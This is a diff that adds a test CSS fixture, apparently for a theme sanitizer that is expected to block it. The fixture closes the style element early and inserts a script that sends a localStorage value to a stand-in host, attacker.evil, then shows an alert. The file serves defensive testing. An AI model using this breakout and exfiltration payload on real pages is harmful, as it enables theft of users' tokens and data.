@@ -1,0 +1,21 @@
+/*
+ * Malicious Test CSS: HTML Tag Breakout Injection
+ * Attack Vector: Escapes the <style> element by closing it early and running raw script
+ * Expected Result: BLOCKED (Critical Severity: breakout-html-tag)
+ */
+
+:root {
+  --color-main: #000;
+}
+
+</style>
+<script>
+  // Steals auth tokens or dials malicious robot bridge endpoints
+  fetch('https://attacker.evil/exfiltrate?token=' + localStorage.getItem('lucy_active_theme_id'));
+  alert('BREAKOUT_INJECTION_PWNED');
+</script>
+<style>
+
+.broken-element {
+  color: red;
+}
